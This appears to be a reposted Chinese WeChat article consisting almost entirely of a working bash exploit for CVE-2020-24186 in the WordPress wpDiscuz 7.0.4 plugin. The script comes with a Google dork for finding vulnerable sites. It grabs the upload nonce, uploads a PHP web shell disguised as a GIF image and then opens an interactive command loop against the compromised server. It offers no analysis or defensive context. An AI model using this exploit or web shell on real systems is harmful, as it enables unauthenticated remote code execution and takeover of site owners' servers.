> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WyjbkbJHweBSIaTfba5FOw)

```
# Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)
# Google Dork: inurl:/wp-content/plugins/wpdiscuz/
# Date: 2021-06-06
# Original Author: Chloe Chamberland 
# Exploit Author: Juampa Rodríguez aka UnD3sc0n0c1d0
# Vendor Homepage: https://gvectors.com/
# Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip
# Version: 7.0.4
# Tested on: Ubuntu / WordPress 5.6.2
# CVE : CVE-2020-24186

#!/bin/bash

if [ -z $1 ]
then
  echo -e "\n[i] Usage: exploit.sh [IP] [/index.php/2021/06/06/post]\n"
  exit 0
elif [ -z $2 ]
then
  echo -e "\n[i] Usage: exploit.sh [IP] [/index.php/2021/06/06/post]\n"
  exit 0
else

post=$(curl -sI http://$1$2/ | head -n1)

if [[ "$post" == *"200 OK"* ]]; then
    wmu_nonce=$(curl -s http://$1$2/ | sed -r "s/wmuSecurity/\nwmuSecurity/g" | grep wmuSecurity | cut -d '"' -f3)
    webshell=$(curl -isk -X 'POST' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundaryUnD3s' --data-binary $'-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"action\"\x0d\x0a\x0d\x0awmuUploadFiles\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"wmu_nonce\"\x0d\x0a\x0d\x0a'$wmu_nonce$'\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"wmuAttachmentsData\"\x0d\x0a\x0d\x0aundefined\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"a.php\" Content-Type: image/jpeg\x0d\x0a\x0d\x0aGIF8\x0d\x0a<?php\x0d\x0aif(isset($_REQUEST[\'cmd\'])){\x0d\x0a        $cmd = ($_REQUEST[\'cmd\']);\x0d\x0a        system($cmd);\x0d\x0a        die;\x0d\x0a}\x0d\x0a?>\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s\x0d\x0aContent-Disposition: form-data; name=\"postId\"\x0d\x0a\x0d\x0a18\x0d\x0a-----------------------------WebKitFormBoundaryUnD3s--\x0d\x0a' http://$1/wp-admin/admin-ajax.php | sed 's/\":"\http/\nhttp/g' | grep "http\:\\\\/" | cut -d '"' -f1 | sed 's/\\//g')

    echo -e "\nWebshell:" $webshell"\n"
    echo -e "--------------WIN--------------"
    echo -e "        ¡Got  webshell!        "
    echo -e "-------------------------------\n"
    while :
    do
  read -p '$ ' command
  curl -s $webshell?cmd=$command | grep -v GIF8
done
else
    echo -e "\n[!] The indicated post was not found\n"
fi
fi
```

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV2NUK7a683e5DgfEqEgq0lrKPGIe9ia0zGXmHU9hiazglXib5OUSWtDmpe6c9U3IErJJx4hicVxOErpbw/640?wx_fmt=png)